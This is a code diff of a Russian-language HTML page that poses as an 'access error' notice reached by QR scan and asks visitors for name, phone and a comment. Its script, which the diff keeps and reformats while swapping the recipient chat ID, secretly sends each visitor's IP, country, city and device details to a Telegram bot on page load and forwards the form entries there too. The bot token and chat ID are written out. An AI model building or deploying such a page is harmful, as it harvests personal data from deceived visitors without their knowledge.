@@ -5,13 +5,23 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Ошибка доступа</title>
   <style>
-    body { font-family: sans-serif; text-align: center; padding: 20px; background: #f8f8f8; }
-    input, button { padding: 10px; width: 80%; margin: 10px 0; }
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      padding: 20px;
+      background: #f8f8f8;
+    }
+    input, button {
+      padding: 10px;
+      width: 80%;
+      margin: 10px 0;
+    }
   </style>
 </head>
 <body>
   <h2>⚠️ У ВАС НЕТ ПОЛНОГО ДОСТУПА</h2>
   <p>Сканируйте через официальный сайт или обратитесь к владельцу.</p>
+
   <form id="userForm">
     <input type="text" placeholder="Имя" id="name" required><br>
     <input type="tel" placeholder="Номер телефона" id="phone" required><br>
@@ -20,30 +30,33 @@
   </form>
 
   <script>
-    const token = '8170136847:AAFKzcOZnmbF9Ci82_0nrr1kpKVt09DCACE';
-    const chatId = 531476943; // замените, если ваш ID другой
+    const token = '8170136847:AAFKzcOZnmbF9Ci82_0nrr1kpKVt09DCACE'; // ваш токен
+    const chatId = 851577256; // ваш Telegram ID
 
-    // Отправка данных при заходе
-    fetch('https://ipinfo.io/json?token=5f3d6e97d7f7a4').then(res => res.json()).then(data => {
-      const text = `🚨 QR-СКАН:
+    // Автоматическая отправка при заходе на сайт
+    fetch('https://ipinfo.io/json?token=5f3d6e97d7f7a4')
+      .then(res => res.json())
+      .then(data => {
+        const text = `🚨 QR-СКАН:
 🌍 IP: ${data.ip}
 📍 Страна: ${data.country}
-📱 Браузер: ${navigator.userAgent}
-🕒 Дата: ${new Date().toLocaleString()}`;
-      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text })
+📡 Город: ${data.city}
+🕒 Время: ${new Date().toLocaleString()}
+📱 Устройство: ${navigator.userAgent}`;
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chatId, text })
+        });
       });
-    });
 
-    // Отправка формы
+    // Отправка данных из формы
     document.getElementById('userForm').addEventListener('submit', function(e) {
       e.preventDefault();
       const name = document.getElementById('name').value;
       const phone = document.getElementById('phone').value;
       const comment = document.getElementById('comment').value;
-      const msg = `📥 ФОРМА:
+      const msg = `📥 ДАННЫЕ ПОЛЬЗОВАТЕЛЯ:
 👤 Имя: ${name}
 📞 Телефон: ${phone}
 💬 Комментарий: ${comment}`;
@@ -52,7 +65,7 @@
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ chat_id: chatId, text: msg })
       });
-      alert('Данные отправлены. Спасибо!');
+      alert("✅ Отправлено! Спасибо.");
     });
   </script>
 </body>
